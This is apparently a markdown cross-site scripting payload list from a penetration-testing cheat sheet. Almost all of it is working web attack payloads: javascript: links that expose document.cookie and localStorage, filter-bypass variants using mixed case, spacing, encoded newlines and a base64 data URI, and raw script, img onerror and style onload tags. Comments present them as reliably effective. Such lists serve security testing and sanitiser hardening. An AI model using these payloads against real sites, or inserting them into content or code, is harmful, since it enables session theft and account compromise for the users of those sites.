<!-- markdow link to XSS, this usually always work but it requires interaction -->
[a](javascript:prompt(document.cookie))

<!-- Other links attacks with some bypasses -->
[Basic](javascript:alert('Basic'))
[Local Storage](javascript:alert(JSON.stringify(localStorage)))
[CaseInsensitive](JaVaScRiPt:alert('CaseInsensitive'))
[URL](javascript://www.google.com%0Aalert('URL'))
[In Quotes]('javascript:alert("InQuotes")')
[a](j a v a s c r i p t:prompt(document.cookie))
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
[a](javascript:window.onerror=alert;throw%201)


<style onload="alert(0)">
<!-- XSS with regular tags -->
<script>alert(1)</script>
<img src=x onerror=alert(1) />

